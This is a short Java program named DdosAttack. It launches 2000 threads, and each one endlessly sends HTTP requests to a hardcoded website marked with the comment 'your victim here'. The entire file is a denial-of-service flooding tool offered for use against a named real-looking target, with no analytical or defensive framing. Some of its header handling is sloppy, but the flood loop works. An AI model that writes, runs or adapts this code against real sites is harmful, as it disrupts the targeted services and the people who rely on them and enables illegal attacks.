import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DdosAttack {

	public static void main(String[] args) throws Exception {
		for (int i = 0; i < 2000; i++) {
			DdosThread thread = new DdosThread();
			thread.start();
		}
	}

	public static class DdosThread extends Thread {

		private AtomicBoolean running = new AtomicBoolean(true);
		private final String request = "http://employethiopia.com"; //your victim here
		private final URL url;

		String param = null;

		public DdosThread() throws Exception {
			url = new URL(request);
			param = "param1=" + URLEncoder.encode("87845", "UTF-8");
		}

		@Override
		public void run() {
			while (running.get()) {
				try {
					attack();
				} catch (Exception e) {

				}

			}
		}

		public void attack() throws Exception {
			HttpURLConnection connection = (HttpURLConnection) url
					.openConnection();
			connection.setDoOutput(true);
			connection.setDoInput(true);
			connection.setRequestMethod("GET");
			connection.setRequestProperty("charset", "utf-8");
			connection.setRequestProperty("Host", this.request);
			
			connection.setRequestProperty("Content-Type",
					"application/x-www-form-urlencoded");
			connection.setRequestProperty("Content-Length", param);
			System.out.println(this + " " + connection.getResponseCode());
			connection.getInputStream();
		}
	}

}